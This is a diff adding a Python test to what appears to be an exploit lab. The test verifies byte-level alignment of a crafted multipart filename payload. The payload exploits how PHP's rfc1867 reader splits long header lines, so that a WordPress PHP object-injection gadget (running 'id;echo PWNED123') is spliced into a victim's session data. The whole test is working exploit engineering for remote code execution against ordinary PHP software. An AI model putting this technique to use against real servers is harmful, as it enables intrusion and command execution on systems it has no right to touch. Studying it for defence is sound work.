@@ -303,3 +303,54 @@ def test_wp_gadget_payload():
                      + payload + b'";', p_start, lab.e_offset(), payload)
     finally:
         lab.set_gadget("filecache")
+
+
+def test_wp_filename_payload_alignment():
+    """The wordpress carrier payload must land its structural tail on a
+    FILLUNIT (5120B) boundary of the Content-Disposition line.
+
+    PHP's multipart reader (main/rfc1867.c) returns over-long header
+    lines in FILLUNIT-sized pieces; a continuation piece containing ':'
+    is parsed as a new header, which truncates the filename. A piece
+    that starts with whitespace is appended unconditionally - so the
+    payload is "A's + space + SUFFIX + gadget + pad" with the space
+    exactly on a piece boundary, and wp_align_geometry() shifts LEN2
+    until that holds.
+    """
+    lab.set_geometry("big")
+    lab.set_gadget("wordpress", "id;echo PWNED123")
+    try:
+        lab.wp_align_geometry()
+        p_head = lab.t1_record_len() + lab.carrier_head_len()
+        f, e = lab.f_offset(), lab.e_offset()
+        payload = lab.build_filename_payload()
+
+        # the space sits on a FILLUNIT boundary of the header line
+        space_idx = e - p_head - 1
+        assert payload[space_idx:space_idx + 1] == b" "
+        assert (lab.CD_PREFIX + space_idx) % lab.FILLUNIT == 0
+        # SUFFIX's leading quote lands exactly at e (the splice window
+        # end): that is what closes R's filename string in the mix
+        assert payload[space_idx + 1:space_idx + 1 + len(lab.SUFFIX)] \
+            == lab.SUFFIX
+        # the gadget record follows the suffix, then the pad opener
+        obj_at = space_idx + 1 + len(lab.SUFFIX)
+        assert payload[obj_at:obj_at + 13] == b'evil|O:13:"WP'
+        assert payload.endswith(b'pad|s:0:"')
+        # the victim's request must still fit under post_max_size
+        victim_body = 3000 + lab.LEN2 + len(lab.DATA_REPL) + 4096
+        assert victim_body < 8_388_608
+        # simulate PHP's piece reader: no continuation piece may hold
+        # a ':' unless it starts with whitespace
+        wire = lab.escape_filename(payload)
+        line = (f'Content-Disposition: form-data; name="file"; '
+                f'filename="{wire.decode("latin-1")}"').encode()
+        pieces = [line[i:i + lab.FILLUNIT]
+                  for i in range(0, len(line), lab.FILLUNIT)]
+        for piece in pieces[1:]:
+            if b":" in piece:
+                assert piece[:1].isspace(), \
+                    f"piece at {line.find(piece)} would truncate the header"
+    finally:
+        lab.set_geometry("small")
+        lab.set_gadget("filecache")
